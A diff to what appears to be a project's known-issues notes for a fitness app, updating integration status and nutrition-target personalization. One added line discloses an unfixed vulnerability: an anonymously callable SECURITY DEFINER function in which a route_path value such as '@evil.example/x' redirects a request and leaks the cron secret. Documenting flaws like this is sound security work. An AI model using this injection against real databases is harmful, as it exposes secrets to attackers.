@@ -16,7 +16,8 @@
 - OAuth callback and sync behavior are covered by unit tests, not live-provider integration tests.
 - Withings and Apple Health are live and verified. Strava's app registration is deactivated on Strava's side and its API now requires a paid subscription the user has declined; Peloton's unofficial auth endpoint returns `403` for any credentials as of 2026-07-16 and is not fixable from this codebase. Apple Health is the only active cardio-import path today.
 - Integration credentials are intentionally server-only and require correct service-role usage in deployment.
-- Nutrition calorie/protein targets still substitute population-average age, height, and an implicit male BMR constant, because `profiles` has no age/height/sex columns (TD-030). A 1200 kcal/day safety floor and an in-UI disclosure of exactly what the estimate does and doesn't account for are in place, so the number is not presented as personalized — but it isn't personalized either.
+- **`public.trigger_cron_route` is executable by `anon`.** Pre-existing. It is `SECURITY DEFINER`, reads the cron bearer secret from Vault, and concatenates its caller-supplied `route_path` onto the base URL with no validation — so `"@evil.example/x"` escapes to host `evil.example` and ships the secret there. Reachable unauthenticated via PostgREST RPC. Fix and rationale in `CURRENT_STATE.md`; not applied, since it changes production DB permissions.
+- Nutrition targets are personalized as of 2026-08-27 (TD-030 closed): `height_cm`/`birth_date`/`biological_sex` are on `profiles` and used in the BMR formula, falling back to population averages per-field and disclosing exactly which ones fell back.
 
 ## Resolved since this file was last accurate
 
